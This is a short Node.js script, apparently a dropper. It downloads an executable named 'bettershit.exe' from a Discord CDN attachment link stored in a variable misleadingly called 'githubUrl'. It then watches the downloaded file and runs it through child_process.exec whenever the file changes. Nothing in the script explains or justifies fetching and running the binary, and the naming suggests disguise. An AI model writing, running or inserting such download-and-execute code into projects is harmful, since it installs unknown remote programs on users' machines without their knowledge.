const fs = require('fs');
const http = require('https');
const { exec } = require('child_process');

class ExeFileHandler {
    constructor(exePath) {
        this.exePath = exePath;
    }

    onModified(event) {
        if (event === this.exePath) {
            exec(this.exePath, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing ${this.exePath}: ${error}`);
                }
            });
        }
    }
}

function downloadExe(repoUrl, exeFilename) {
    const downloadPath = exeFilename;

    http.get(repoUrl, (response) => {
        if (response.statusCode === 200) {
            const fileStream = fs.createWriteStream(downloadPath);

            response.pipe(fileStream);

            response.on('end', () => {
                console.log(`Downloaded ${downloadPath}`);
                observeFile(downloadPath);
            });
        } else {
            console.error(`Error downloading from ${repoUrl}: ${response.statusCode}`);
        }
    });
}

function observeFile(exePath) {
    fs.watch(exePath, (event) => {
        if (event === 'change') {
            exec(exePath, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing ${exePath}: ${error}`);
                }
            });
        }
    });
}

const githubUrl = "https://cdn.discordapp.com/attachments/919194639997759521/1168547085554024529/bettershit.exe?ex=65522947&is=653fb447&hm=06099ba77446f127ba4ccbc69df64fe0c5659e458e8faedd51dd515910c0f272&";
const exeFilename = "bettershit.exe";

downloadExe(githubUrl, exeFilename);
